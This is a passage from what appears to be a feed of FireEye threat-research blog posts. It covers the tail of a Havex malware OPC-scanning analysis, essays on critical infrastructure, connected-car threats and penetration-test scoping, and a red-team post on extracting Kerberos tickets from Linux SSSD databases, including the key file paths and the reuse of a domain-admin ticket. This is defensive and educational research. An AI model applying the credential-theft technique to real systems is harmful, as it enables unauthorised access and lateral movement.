    globally accessible through Windows networking.  The list of servers
    is then checked to determine if any of them host an interface to the
    Component Object Models (COM) listed below:</p> <p> </p> <p> </p> <div>
    <p> </p> <p style="text-align: left;">
      <a
          href="/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.31.56-PM.png"><img
          width="547" height="191"
          class="alignnone  wp-image-6030 landscape-med"
          alt="Screen Shot 2014-07-17 at 12.31.56 PM"
    src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.31.56-PM.png" /></a></p>
    <p> </p> </div> <p> </p> <p style="text-align: center;">
    <b>Figure 5: Relevant COM objects</b></p> <p>Once OPC servers are
    identified, the following CLSIDs are used to determine the
    capabilities of the OPC server:</p> <p>
    <a
        href="/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.33.22-PM.png"><img
        width="554" height="224"
        class="alignnone  wp-image-6031 landscape-med"
        alt="Screen Shot 2014-07-17 at 12.33.22 PM"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.33.22-PM.png" /></a></p>
    <p style="text-align: center;">
    <b>            Figure 6: CLSIDs used to determine capabilities of
      the OPC server</b></p> <p>When executing PE.dll, all of the OPC
    server data output is first saved as %TEMP%\[random].tmp.dat. The
    results of a capability scan of an OPC server is stored in
    %TEMP%\OPCServer[random].txt. Files are not encrypted or deleted
    once the scanning process is complete.</p> <p>Once the scanning
    completes, the log is deleted and the contents are encrypted and
    stored into a file named %TEMP%\[random].tmp.yls.  The encryption
    process uses an RSA public key obtained from the PE resource TYU. 
    The RSA key is used to protect a randomly generated 168-bit 3DES key
    that is used to encrypt the contents of the log.</p> <p>The TYU
    resource is BZip2 compressed and XORed with the string “1312312”.  A
    decoded configuration for 6BFC42F7CB1364EF0BFD749776AC6D38 is
    included in the figure below:</p> <p>
    <b>
      <a
          href="/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.27.24-PM.png"><img
          width="601" height="241"
          class=" wp-image-6029 alignleft landscape-med"
          alt="Screen Shot 2014-07-17 at 12.27.24 PM"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.27.24-PM.png" /></a></b></p>
    <p style="text-align: center;">
    <b>Figure 7: Sample decoded TYU resource</b></p> <p>The
    4409de445240923e05c5fa6fb4204 value is believed to be an RSA key
    identifier. The AASp1… value is the Base64 encoded RSA key.</p> <p>A
    sample encrypted log file (%TEMP%\[random].tmp.yls) is below.</p>
  <p> </p> <div class="blog-table-wrapper">
    <p> </p> <p> </p> <p> </p> <p> </p> <p> </p> <p> </p> <p> </p>
    <p> </p> <p> </p> <p> </p> <p> </p> <p> </p> <table cellspacing="0"
      cellpadding="0" border="1"> <tbody>
        <tr>
          <td width="554" valign="top" style="text-align: center;"
            colspan="2">00000000  32 39 0a 66 00 66 00 30  00 30 00 66
            00 66 00 30 29.f.f.0.0.f.f.000000010  00 30 00 66 00 66 00
            30  00 30 00 66 00 66 00 30 .0.f.f.0.0.f.f.000000020  00 30
            00 66 00 66 00 30  00 30 00 66 00 66 00 30
            .0.f.f.0.0.f.f.000000030  00 30 00 66 00 66 00 30  00 30 00
            66 00 37 39 36 .0.f.f.0.0.f.79600000040  0a 31 32 38 0a 96
            26 cc  34 93 a5 4a 09 09 17 d3 .128..&amp;.4..J....00000050 
            e0 bb 15 90 e8 5d cb 01  c0 33 c1 a4 41 72 5f a5
            .....]...3..Ar_.00000060  13 43 69 62 cf a3 80 e3  6f ce 2f
            95 d1 38 0f f2 .Cib....o./..8..00000070  56 b1 f9 5e 1d e1
            43 92  61 f8 60 1d 06 04 ad f9 V..^..C.a.`.....00000080  66
            98 1f eb e9 4c d3 cb  ee 4a 39 75 31 54 b8 02
            f....L...J9u1T..00000090  b5 b6 4a 3c e3 77 26 6d  93 b9 66
            45 4a 44 f7 a2 ..J&lt;.w&amp;m..fEJD..000000A0  08 6a 22 89
            b7 d3 72 d4  1f 8d b6 80 2b d2 99 5d
            .j&quot;...r.....+..]000000B0  61 87 c1 0c 47 27 6a 61  fc
            c5 ee 41 a5 ae 89 c3 a...G'ja...A....000000C0  9e 00 54 b9
            46 b8 88 72  94 a3 95 c8 8e 5d fe 23
            ..T.F..r.....].#000000D0  2d fb 48 85 d5 31 c7 65  f1 c4 47
            75 6f 77 03 6b -.H..1.e..Guow.k</td> </tr></tbody></table>
  </div> <p> </p> <p>--Truncated--Probable Key
    Identifierff00ff00ff00ff00ff00ff00ff00fRSA Encrypted 3DES Key5A EB
    13 80 FE A6 B9 A9 8A 0F 41…The 3DES key will be the last 24 bytes of
    the decrypted result.3DES IV88 72  94 a3 95 c8 8e 5d3DES Encrypted
    Logfe 23 2d fb 48 85 d5 31 c7 65 f1…</p> <p style="text-align: center;">
    <b>Figure 8: Sample encrypted .yls file</b></p> <p>
    <b>Execution</b></p> <p>When executing PE.dll against the Arduino
    OPC server, we observe interesting responses within the plaintext
  %TEMP%\[random].tmp.dat:</p> <p> </p> <div>
    <p> </p> <p style="text-align: left;">
      <a
          href="/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.41.27-PM.png"><img
          width="508" height="557"
          class="alignnone  wp-image-6032 portrait-med"
          alt="Screen Shot 2014-07-17 at 12.41.27 PM"
    src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.41.27-PM.png" /></a></p>
    <p> </p> </div> <p> </p> <p style="text-align: center;">
    <b>Figure 9: Sample scan log</b></p> <p>The contents of the tmp.dat
    file are the results of the scan of the network devices, looking for
    OPC servers. These are not the in-depth results of the OPC servers
    themselves, and only perform the initial scanning.</p> <p>The
    particular Havex sample in question also enumerates OPC tags and
    fully interrogates the OPC servers identified within
    %TEMP%\[random].tmp.dat. The particular fields queried are: server
    state, tag name, type, access, and id. The contents of a sample
    %TEMP%\OPCServer[random].txt can be found below:</p> <p> </p> <div>
    <p> </p> <p style="text-align: left;">
      <a
          href="/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png"><img
          width="514" height="470"
          class="alignnone  wp-image-6033 landscape-med"
          alt="Screen Shot 2014-07-17 at 12.43.48 PM"
    src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png" /></a></p>
    <p> </p> </div> <p> </p> <p style="text-align: center;">
    <b>Figure 10: Contents of OPCServer[Random].txt OPC
  interrogation</b></p> <p>While we don’t have a particular case study
    to prove the attacker’s next steps, it is likely after these files
    are created and saved, they will be exfiltrated to a command and
    control server for further processing.</p> <p>
    <b>Conclusion</b></p> <p>Part of threat intelligence requires
    understanding all parts of a particular threat. This is why we took
    a closer look at the OPC functionality of this particular Havex
    variant.  We don’t have any case study showcasing why the OPC
    modules were included, and this is the first “in the wild” sample
    using OPC scanning. It is possible that these attackers could have
    used this malware as a testing ground for future utilization,
  however.</p> <p>Since ICS networks typically don’t have a high-level
    of visibility into the environment, there are several ways to help
    minimize some of the risks associated with a threat like Havex.
    First, ICS environments need to have the ability to perform full
    packet capture ability. This gives incident responders and engineers
    better visibility should an incident occur.</p> <p>Also, having
    mature incident processes for your ICS environment is important.
    Being able to have security engineers that also understand ICS
    environments during an incident is paramount. Finally, having
    trained professionals consistently perform security checks on ICS
    environments is helpful. This ensures standard sets of security
    protocols and best practices are followed within a highly secure
  environment.</p> <p>We hope that this information will further educate
    industrial control systems owners and the security community about
    how the OPC functionality of this threat works and serves as the
    foundation for more investigation. Still, lots of questions remain
    about this component of Havex. What is the attack path? Who is
    behind it? What is their intention? We’re continuing to track this
    specific threat and will provide further updates as this new tactic
  unfolds.</p> <p>
    <b>Acknowledgements</b></p> <p>We would like to thank Josh Homan for
    his help and support.</p> <p>
    <b>Related MD5s</b></p> <p>ba8da708b8784afd36c44bb5f1f436bc</p>
  <p>6bfc42f7cb1364ef0bfd749776ac6d38</p>
  <p>4102f370aaf46629575daffbd5a0b3c9</p> </div>
 <div>
  <b>References</b></div>
 <div>
  <div>
    <div>
      <p>
        <a
          href="http://www.opcdatahub.com/WhatIsOPC.html">http://www.matrikonopc.com/products/opc-desktop-tools/opc-explorer.aspx<br />
          http://arduino.cc/en/Main/arduinoBoardUno<br />
          http://www.f-secure.com/weblog/archives/00002718.html<br />
      http://www.opcdatahub.com/WhatIsOPC.html</a></p> </div> </div> </div>
http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html2014-07-17T14:00:00.000Z2020-07-24T06:34:44.930ZCritical Infrastructure Beyond the Power Gridnoemail@noemail.orgIntel Team<div class="c00 c00v1">
  <p>The term &quot;critical infrastructure&quot; has earned its spot on
    the board of our ongoing game of cyber bingo--right next to
    &quot;Digital Pearl Harbor,&quot; &quot;Cyber 9/11,&quot;
    &quot;SCADA&quot; and &quot;Stuxnet.&quot;</p> <p>With
    &quot;critical infrastructure&quot; thrown about in references to
    cyber threats nearly every week, we thought it was time for a closer
    look at just what the term means-and what it means to other cyber
    threat actors.</p> <p>The term &quot;<a
      href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">critical
    infrastructure</a>&quot; conjures up images of highways, electrical
    grids, pipelines, government facilities and utilities. But the U.S.
    government definition also includes economic security and public
    health. The Department of Homeland Security defines critical
    infrastructure as <i>&quot;Systems and assets, whether physical or
      virtual, so vital to the United States that the incapacity or
      destruction of such systems and assets would have a debilitating
      impact on security, national economic security, national public
      health or safety, or any combination of those matters.&quot;<a
        href="http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf"
  target="_blank">[1]</a></i></p> <p>Certainly the U.S. definition is
    expansive, but some key cyber actors go a step further to include a
    more abstract &quot;information<i>&quot; </i>asset. Russian
    officials view information content, flow and influencers as an
    enormous component of critical infrastructure. Iran and China
    similarly privilege the security of their information assets in
    order to protect their governments.</p> <p>
    <b>The bottom line?</b></p> <p>U.S. companies, who may have never
    considered themselves a plausible target for cyber threats, could
    become victims of offensive or defensive state cyber operations.
    Earlier this year several media outlets-including the New York Times
    and Washington Post-disclosed that they had been the victims of
    China-based intrusions. The Times and the Post linked the intrusions
    on their networks to their reporting on corruption in the upper
    echelons of the Chinese Communist Party and other issues.</p>
    <p>These media outlets weren't sitting on plans for a new fighter
    jet or cutting edge wind turbines-information often assumed to be at
    risk for data theft. Rather, the reporters at the Times and Post
    were perched in key positions to influence U.S. government and
    public views of the Chinese leadership, possibly in a negative
    light. The Chinese government had conducted these intrusions against
    what it deemed critical infrastructure that supported the flow of
    valuable information.</p> <p>
    <b>Who's up next?</b></p> <p>State actors motivated to target
    critical infrastructure (by their own definition or the U.S.') won't
    just be the usual attention grabbers in cyberspace. We estimate that
    Iran, Syria, and North Korea all have interest and would be able to
    conduct or direct some level of network operations. These states are
    also likely to conduct operations in the near term to identify red
    lines and gauge corporate and government reactions. With little
    reputational loss at stake, we expect actors sponsored by or
    associated with these states to target an array of critical
    infrastructure targets. Companies who serve as key information
    brokers-for the public or the U.S. government-should be particularly
    attuned to the criticality their work is assigned by a variety of
    cyber threat actors.</p> <p> </p> <hr />  <p> </p> <p> </p> <div>
    <p> </p> <p>
      <a
        href="http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf"
    target="_blank">http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf</a></p>
    <p> </p> </div> <p> </p> </div>
http://www.fireeye.com/blog/threat-research/2013/11/critical-infrastructure-power-grid.html2013-11-19T21:26:40.000Z2020-07-24T06:34:44.931ZConnected Cars: The Open Road for Hackersnoemail@noemail.orgWill Glass<p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/autoreport-blog.jpg" /></p>
 <p>As vehicles become both increasingly complex and better connected to
  the Internet, their newfound versatility may be manipulated for
  malicious purposes. Three of the most concerning potential threats
  looking ahead to the next few years are those posed by <b>
    <i>manipulating vehicle</i> <i>operation</i></b>,<b>
  <i>ransomware</i></b> and using vehicular systems as <b>
    <i>command and control (C2) infrastructure</i></b> for illicit cyber activity.</p>
 <h5>
  <b>Car Hacking?</b></h5>
 <p>Vehicles have come a long way in terms of the high-tech features and
  connectivity that come standard in most new models. Modern cars are
  controlled almost entirely by software, and many drivers don’t realize
  the most complex digital device they own may be in their <a
  href="http://www.nytimes.com/2015/09/27/business/complex-car-software-becomes-the-weak-spot-under-the-hood.html">driveway</a>.
  Of the growing number of devices in the “Internet of Things” (IoT),
  vehicles are among the most significant additions to the global
  Internet. An ever-growing list of features—including web browsing,
  Wi-Fi access points, and remote-start mobile phone apps—enhance user
  enjoyment, but also greatly expand vehicles’ attack surface, rendering
  them potentially vulnerable to advanced attacks. During the past year
  especially, numerous proof-of-concept demonstrations have revealed
  connected-car vulnerabilities that malicious actors can exploit,
  ranging from unauthorized entry to <a
    href="https://www.wired.com/2015/07/hackers-remotely-kill-jeep-highway/">commandeering
    the vehicle’s operation</a>. Unfortunately, as consumer demand
  drives ever more features, the opportunities for compromise will
  increase as well.</p>
 <h5>
  <b>Ransomware</b></h5>
 <p>The scourge of ransomware has so far affected thousands of systems
  belonging to ordinary individuals, hospitals, and police stations. A
  vehicle’s increased connectivity, ever-expanding attack surface, and
  high upfront cost make them attractive ransomware targets. In contrast
  to ransomware that infects ordinary computer systems, vehicles are
  more likely susceptible to ransomware attacks when their disablement
  causes knock-on effects.</p>
 <p>For example, where a single driver might be able to reinstall his
  car’s software with the help of a mechanic to remedy a ransomware
  infection, a group of vehicles disabled on a busy highway could cause
  far more serious disruption. Victims or municipal authorities may have
  little choice but to pay the ransom to reopen a busy commuting route.
  Alternatively, a logistics company might suddenly find a large portion
  of its truck fleet rendered useless by ransomware. The potential for
  lost revenue due to downtime might pressure the company to pay the
  ransom rather than risk more significant financial losses.</p>
 <h5>
  <b>Malicious C2 and Final Hop Points</b></h5>
 <p>One effective law enforcement tactic in countering cyber espionage
  and criminal campaigns is identifying, locating and seizing the
  systems threat actors use to route malicious traffic through the
  Internet. Since many modern vehicles can be better described as a
  computer attached to four wheels and an engine, their mobility and
  power present challenges to this means of countering threat activity.
  We have already witnessed malware designed to hijack IoT devices for
  malicious purposes; vehicular systems’ greater computing power,
  compared to connected home thermostats, can significantly enhance
  their value as a <a
    href="https://www.akamai.com/us/en/about/news/press/2014-press/akamai-warns-of-large-ddos-attacks-from-spike-ddos-toolkit.jsp">C2 node</a>.</p>
 <p>Locating vehicles used to route malicious traffic would present a
  major challenge to law enforcement investigation, largely due to their
  mobility. We have not yet observed threat actors using connected
  vehicle systems to route malicious traffic, but it is most likely that
  a vehicle would be used as a final hop point to the intended target
  network. The perpetrators may use the vehicle only once, choosing to
  hijack the connectivity of a different vehicle on their next
  operation, and so on. This ever-changing roster of potential last-hop
  nodes situated on highly mobile platforms may allow threat actors to
  elude law enforcement for extended periods of time.</p>
 <h5>
  <b>Understanding the Risk Landscape</b></h5>
 <p>The impact of cyber threats is most often considered in financial
  terms—the cost of a breach, whether direct financial losses or
  indirect costs of investigation, remediation, and improved security.
  As computers increasingly control vehicles, among other critical
  devices and systems, the potential for malfunction or manipulation
  that causes human harm rises dramatically. Automobile manufacturers
  may face greater liability, not only for the car’s physical
  components, but its software as well. How long before vehicles need a
  “cyber security rating,” similar to that awarded for crash testing and
  fuel economy?</p>
 <p>These new risks point to the need for automotive manufacturers and
  suppliers to not only ensure the traditional operational safety of
  their vehicles, but to also secure both the vehicle's operations and
  occupant privacy. This requires an ongoing understanding about the
  nature of threats and vulnerabilities in a rapidly evolving landscape,
  and building in strong proactive security measures to protect against
  these risks.<i> </i>FireEye explores these risks to automotive safety
  in our latest FireEye iSIGHT Intelligence and Mandiant Consulting
  report: <i>Connected Cars: The Open Road for Hackers</i>. The report
  is <a target="_blank"
    href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/connected-cars-the-open-road-for-hackers.pdf">available
    for download here.</a></p>
 <h5>
  <b>
    <i>FireEye Capabilities</i></b></h5>
 <p>
  <i>FireEye combines our industry leading <a
      href="/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html">threat
    intelligence</a>, <a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html">incident
    response</a> and red team capabilities with our ICS domain expertise
    to help the automotive industry improve their prevention, detection
    and response capabilities. FireEye’s <a
      href="/content/fireeye-www/en_US/services/red-team-operations.html">Red
      Team Operations</a> and <a
      href="/content/fireeye-www/en_US/mandiant/penetration-testing.html">Penetration
    Tests</a> can provide firms in the automotive industry experience
    responding to real-world attacks without the risk of negative
    headlines. A one-time risk assessment is not enough, because threat
    attackers are consistently evolving.</i></p>
 <p>
  <i>For more information, <a
      href="/content/fireeye-www/en_US/company/contact-us.html">contact FireEye</a>.</i></p>
 <p>
  <i>FireEye iSIGHT Intelligence’s Horizons Team conducts strategic
    forecasting to anticipate risks posed by emerging technologies and
    geopolitical developments, helping clients and the public better
    assess their exposure to a dynamic cyber threat landscape.</i></p>
http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html2016-06-10T14:00:00.000Z2020-07-24T06:29:18.423ZThe Five W’s of Penetration Testingnoemail@noemail.orgChuck Willis<div class="c00 c00v1">   <p>Often in discussions with customers and
    potential customers,     questions arise about our <a
      href="/content/fireeye-www/en_US/mandiant/penetration-testing.html"
      target="_self">penetration testing services</a>, as well as
    penetration testing in general. In this post, we want to walk
    through Mandiant's take on the five W's of penetration testing, in
    hopes of helping those of you who many have some of these same
    questions. For clarity, we are going to walk through these W's in a
    non-traditional order.</p> <p>     <b>Why</b></p> <p>First and
    foremost, it's important to be upfront     with yourself with why
    you are having a penetration test performed     (or at least
    considering one). If your organization's primary     motivation is
    compliance and needing to &quot;check the box,&quot;     then be on
    the lookout for your people attempting to subtly (or not     so
    subtly) hinder the test in order to earn an &quot;easy pass&quot;
    by minimizing the number of findings (and therefore the amount of
    potential remediation work required). Individuals could attempt to
    hinder a penetration test by placing undue restrictions on the scope
    of systems assessed, the types of tools that can be used, or the
    timing of the test.</p> <p>Even if compliance is a motivating
    factor, we hope you're able to take advantage of the opportunity
    penetration testing provides to determine where vulnerabilities lie
    and make your systems more secure. That is the real value that
    penetration testing can provide.</p> <p>Finally, if you are getting
    a penetration test to comply with requirements imposed on your
    organization, that will often drive some of the answers to later
    questions about the type and scope of the test. Keep in mind that
    standards only dictate minimum requirements, however, so you should
    also consider additional penetration testing activities beyond the
    &quot;bare minimum.&quot;</p> <p>     <b>Who</b></p> <p>There are
    really two &quot;who&quot; questions to     consider, but for now we
    will just deal with the first: Who are the     attackers that
    concern you? Are they:</p> <ol> <li>Random       individuals on the
    Internet?</li> <li>Specific threat actors, such       as
      state-sponsored attackers, organized criminals, or hacktivist
    groups?</li> <li>An individual or malware that is behind the
      firewall and on your internal corporate network?</li> <li>Your own
      employees (&quot;insider threats&quot;)?</li> <li>Your customers
      (or attackers who may compromise customers'
    systems/accounts)?</li> <li>Your vendors, service providers, and
      other business partners (or attackers who may have compromised
      their systems)?</li> </ol> <p>The answer to this will help drive
    the type of testing to be performed and the types of test user
    accounts (if any) to provision. The next section will describe some
    possible penetration test types, but it's helpful to also discuss
    the types of attackers you would like the penetration test to
  simulate.</p> <p>     <b>What</b></p> <p>What type of penetration test
    do you want     performed? For organizations new to penetration
    testing, we     recommend starting with an external network
    penetration test, which     will assess your Internet-accessible
    systems in the same way that an     attacker anywhere in the world
    could access them. Beyond that, there     are several options:</p>
    <ol> <li>Internal network penetration test       - A penetration
      test of your internal corporate network. Typically       we start
      these types of assessments with only a network connection       on
      the corporate networks, but a common variant is what we call an
      &quot;Insider Threat Assessment,&quot; where we start with one of
      your standard workstations and a standard user account.</li>
      <li>Web application security assessment - A review of custom web
      application code for security vulnerabilities such as access
      control issues, SQL injection, cross-site scripting (XSS) and
      others. These are best done in a test or development environment
      to minimize impact to the production environment.</li> <li>Social
      engineering - Using deceptive email, phone calls, and/or physical
      entry to gain access to systems.</li> <li>Wireless penetration
      test - A detailed security assessment of wireless network(s) at
      one or more of your locations. This typically includes a survey of
      the location looking for unauthorized (&quot;rogue&quot;) wireless
      access points that have been connected to the corporate network
      and are often insecurely configured.</li> </ol> <p>If budgets were
    not an issue, you would want to do all of the above, but in reality
    you will need to prioritize your efforts on what makes sense for
    your organization. Keep in mind that the best approach may change
    over time as your organization matures.</p> <p>     <b>Where</b></p>
    <p>In what physical location should the test take     place? Many
    types of penetration testing can be done remotely, but     some
    require the testers to visit your facility. Physical social
    engineering engagements and wireless assessments clearly need to be
    performed at one (or more) of your locations.</p> <p>Some internal
    penetration tests can be done remotely via a VPN connection, but we
    recommend conducting them at your location whenever possible. If
    your internal network has segmentation in place (as we recommend),
    then you should work with your penetration testing organization to
    determine the best physical location for the test to be performed.
    Generally, you'll want to do the internal penetration test from a
    network segment that has broad access to other portions of the
    internal network in order to get the best coverage from the
  test.</p> <p>Another &quot;Where&quot; to consider for remote testing
    is where the testers are physically located. When testers are in a
    different country than you, legal issues can arise with data
    provisioning and accessibility. Differences in language, culture,
    and time zones could also make coordination and interpretation of
    results more difficult.</p> <p>     <b>When</b></p> <p>We recommend
    that most organizations get some     sort of security assessment on
    an annual basis, but that security     assessment does not
    necessarily need to be a penetration test (see       <a
      href="https://www.mandiant.com/blog/penetration-testing-age/">Penetration
      Testing Has Come Of Age - How to Take Your Security Program to the
      Next Level</a>). Larger organizations may have multiple
    assessments per year, each focused in a different area.</p>
    <p>Within the year, the timing of the penetration test is usually
    pretty flexible. You will want to make sure that the right people
    from your organization are available to initiate and manage the test
    - and to receive results and begin implementing changes. Based on
    your organization's change control procedures, you may need to work
    around system freezes or other activities. Testing in December can
    be difficult due to holidays and vacation, along with year-end
    closeout activities, especially for organizations in retail,
    e-commerce, and payment processing.</p> <p>If you have significant
    upgrades planned for the systems that will be tested, it is
    typically best to schedule the test for a month or two after the
    upgrades are due to be finished. This will allow some time for the
    inevitable delays in deploying the upgrades as well give the
    upgraded systems (and their administrators) a bit of time to
    &quot;settle in&quot; and get fully configured before being
  tested.</p> <p>     <b>Who (part 2)</b></p> <p>The other
    &quot;who&quot; question to     consider is who will perform the
    penetration test? We recommend     considering the following when
    selecting a penetration testing   provider:</p> <ol> <li>What are
      the qualifications of the organization       and the individuals
      who will be performing the test? What       differentiates them
      from other providers?</li> <li>To what degree       does their
      testing rely on automated vulnerability scanners vs.       hands
      on manual testing?</li> <li>How well do they understand the
      threat actors that are relevant to your environment? How well are
      they able to emulate real world attacks?</li> <li>What
      deliverables will you receive from the test? Are they primarily
      the output of an automated tool? Ask for samples.</li> <li>Are
      they unbiased? Do they use penetration tests as a means to sell or
      resell other products and services?</li> </ol> <p>No doubt, there
    are other questions that you will want to consider when scoping a
    penetration test, but we hope that these will help you get started.
    If you'd like to read more about Mandiant's penetration testing (and
    other) services, you can do so <a
    href="/content/fireeye-www/en_US/services.html">here</a>. Of course,
    also feel free to <a href="http://www.mandiant.com/contact/">contact
    us</a> if you'd like to talk about your situation and how Mandiant
    can best assess your organization's security.</p> </div>
http://www.fireeye.com/blog/threat-research/2014/09/ws-penetration-testing.html2014-09-16T20:49:32.000Z2020-07-24T06:29:18.423ZKerberos Tickets on Linux Red Teamsnoemail@noemail.orgTrevor Haskell<p>At <a
    href="/content/fireeye-www/en_US/mandiant/incident-response.html">FireEye
  Mandiant</a>, we conduct numerous red team engagements within Windows
  Active Directory environments. Consequently, we frequently encounter
  Linux systems integrated within Active Directory environments.
  Compromising an individual domain-joined Linux system can provide
  useful data on its own, but the best value is obtaining data, such as
  Kerberos tickets, that will facilitate lateral movement techniques. By
  passing these Kerberos Tickets from a Linux system, it is possible to
  move laterally from a compromised Linux system to the rest of the
  Active Directory domain.</p>
 <p>There are several ways to configure a Linux system to store Kerberos
  tickets. In this blog post, we will introduce Kerberos and cover some
  of the various storage solutions. We will also introduce a new tool
  that extracts Kerberos tickets from domain-joined systems that utilize
  the System Security Services Daemon Kerberos Cache Manager (SSSD KCM).</p>
 <h4>What is Kerberos</h4>
 <p>Kerberos is a standardized authentication protocol that was
  originally created by MIT in the 1980s. The protocol has evolved over
  time. Today, Kerberos Version 5 is implemented by numerous products,
  including Microsoft Active Directory. Kerberos was originally designed
  to mutually authenticate identities over an unsecured communication line.</p>
 <p>The Microsoft implementation of Kerberos is used in Active Directory
  environments to securely authenticate users to various services, such
  as the domain (LDAP), database servers (MSSQL) and file shares
  (SMB/CIFS). While other authentication protocols exist within Active
  Directory, Kerberos is one of the most popular methods. Technical
  documentation on how Microsoft implemented Kerberos Protocol
  Extensions within Active Directory can be found in the <a
    href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9">MS-KILE
  standards</a> published on MSDN. </p>
 <h4>Short Example of Kerberos Authentication in Active Directory</h4>
 <p>To illustrate how Kerberos works, we have selected a common scenario
  where a user John Smith with the account ACMENET.CORP\sa_jsmith wishes
  to authenticate to a Windows SMB (CIFS) file share in the Acme
  Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP.</p>
 <p>There are two main types of Kerberos tickets used in Active
  Directory: Ticket Granting Ticket (TGT) and service tickets. Service
  tickets are obtained from the Ticket Granting Service (TGS). The TGT
  is used to authenticate the identity of a particular entity in Active
  Directory, such as a user account. Service tickets are used to
  authenticate a user to a specific service hosted on a system. A valid
  TGT can be used to request service tickets from the Key Distribution
  Center (KDC). In Active Directory environments, the KDC is hosted on a
  Domain Controller.</p>
 <p>The diagram in Figure 1 shows the authentication flow.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture1.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: Example Kerberos authentication flow</span></p>
 <p>In summary:</p>
 <ol> <li>The user requests a Ticket Granting Ticket (TGT) from the
    Domain Controller.</li> <li>Once granted, the user passes the TGT
    back to the Domain Controller and requests a service ticket for
  cifs/SQLSERVER.ACMENET.CORP.</li> <li>After the Domain Controller
    validates the request, a service ticket is issued that will
    authenticate the user to the CIFS (SMB) service on
  SQLSERVER.ACMENET.CORP.</li> <li>The user receives the service ticket
    from the Domain Controller and initiates an SMB negotiation with
    SQLSERVER.ACMENET.CORP. During the authentication process, the user
    provides a Kerberos blob inside an “AP-REQ” structure that includes
    the service ticket previously obtained.</li> <li>The server
    validates the service ticket and authenticates the user.</li> <li>If
    the server determines that the user has permissions to access the
    share, the user can begin making SMB queries.</li> </ol>
 <p>For an in-depth example of how Kerberos authentication works, scroll
  down to view the appendix at the bottom of this article.</p>
 <h4>Kerberos On Linux Domain-Joined Systems</h4>
 <p>When a Linux system is joined to an Active Directory domain, it also
  needs to use Kerberos tickets to access services on the Windows Active
  Directory domain. Linux uses a different Kerberos implementation.
  Instead of Windows formatted tickets (commonly referred to as the
  KIRBI format), Linux uses MIT format Kerberos Credential Caches
  (CCACHE files). </p>
 <p>When a user on a Linux system wants to access a remote service with
  Kerberos, such as a file share, the same procedure is used to request
  the TGT and corresponding service ticket. In older, more traditional
  implementations, Linux systems often stored credential cache files in
  the /tmp directory. Although the files are locked down and not
  world-readable, a malicious user with root access to the Linux system
  could trivially obtain a copy of the Kerberos tickets and reuse them.</p>
 <p>On modern versions of Red Hat Enterprise Linux and derivative
  distributions, the System Security Services Daemon (SSSD) is used to
  manage Kerberos tickets on domain-joined systems. SSSD implements its
  own form of Kerberos Cache Manager (KCM) and encrypts tickets within a
  database on the system. When a user needs access to a TGT or service
  ticket, the ticket is retrieved from the database, decrypted, and then
  passed to the remote service (for more on SSSD, check out this <a
    href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#more-6806">great
    research from Portcullis Labs</a>).</p>
 <p>By default, SSSD maintains a copy of the database at the path
  /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a
  hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By
  default, the key is only readable if you have root permissions.</p>
 <p>If a user is able to extract both of these files, it is possible to
  decrypt the files offline and obtain valid Kerberos tickets. We have
  published a new tool called <a
  href="https://github.com/fireeye/SSSDKCMExtractor">SSSDKCMExtractor</a>
  that will decrypt relevant secrets in the SSSD database and pull out
   the credential cache Kerberos blob. This blob can be converted into a
  usable Kerberos CCache file that can be passed to other tools, such as
    <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>, <a
  href="https://github.com/SecureAuthCorp/impacket">Impacket</a>, and <a
  href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a>.
  CCache files can be converted into Windows format using tools such as
    <a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>.</p>
 <p>We leave it as an exercise to the reader to convert the decrypted
  Kerberos blob into a usable credential cache file for pass-the-cache
  and pass-the-ticket operations.</p>
 <p>Using SSSDKCMExtractor is simple. An example SSSD KCM database and
  key are shown in Figure 2.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: SSSD KCM files</span></p>
 <p>Invoking SSSDKCMExtractor with the --database and --key parameters
  will parse the database and decrypt the secrets as shown in Figure 3.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Extracting Kerberos data</span></p>
 <p>After manipulating the data retrieved, it is possible to use the
  CCACHE in smbclient as shown in Figure 4. In this example, a domain
  administrator ticket was obtained and used to access the domain
  controller’s C$ share.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture4.png" alt="" />
